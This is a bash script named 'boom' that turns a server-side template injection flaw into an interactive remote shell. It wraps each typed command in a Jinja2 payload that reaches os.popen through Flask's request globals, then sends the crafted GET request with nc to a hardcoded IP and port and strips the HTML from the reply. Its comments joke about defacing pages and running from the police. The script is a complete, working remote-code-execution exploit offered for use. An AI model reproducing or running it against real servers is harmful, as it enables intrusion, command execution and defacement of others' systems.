#!/bin/bash
# boom 0.1
# boom speed up your internet conection
# 1. Find a web exploit
# 2. Configure boom, use it and deface the  page
# 3. Let the police call to your home.
# 4. Run as fast as you can with your rooter o mobile phone.  The internet connection is now faster.

# Config section
HOST=157.245.32.36
PAGE="/"
PORT=30398
PROMPT="boom@$HOST$"

echo -n "$PROMPT "
read CMD 

while [ true ];
do

	if [[ $CMD = "quit" ]]; then
		exit
	fi

        #CMD="export TERM=linux; alias ls='ls --color=always'; $CMD"
        CMD="export TERM=linux; $CMD"


	CMD=`echo $CMD | sed -e "s/ /%20/g"`
	CMD=`echo $CMD | sed -e "s/ls/ls%20--color=always/g"`
        
        
	#echo "COMANDO $CMD"

	method='GET '
        page=$PAGE
        protocol=' HTTP/1.1\n'

        vector="%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('$CMD').read()%7D%7D"

	request0="$method $page$vector $protocol"
	request1="Host: $HOST\n"
	request2="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\n"
	request3="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n"
	request4="Accept-Language: en-US,en;q=0.5\n"
	request5="Accept-Encoding: gzip, deflate\n"
	request6="Connection: keep-alive\n"
	request7="Cookie: PHPSESSID=1756be58e88b7dc944c353ca6854c140\n"
	request8="Upgrade-Insecure-Requests: 1\n"
	request9="Cache-Control: max-age=0\n"
	request10="\n"
	request11="\n"

	request="$request0$request1$request2$request3$request4$request5$request6$request7$request8$request9$request10$request11"

	if [[ $1 == '-debug' ]]; then
		echo -e $request
        fi

	echo -e $request | nc $HOST $PORT 2>&1|\

	 # Removing unwanted output
	 egrep -A100 "The page" | tr "'" ' ' | sed -e 's/<p>The page  <str>//g' |\
	 sed -e 's/<\/str>  could not be found<\/p>//g'

	echo -n "$PROMPT "
	read CMD
done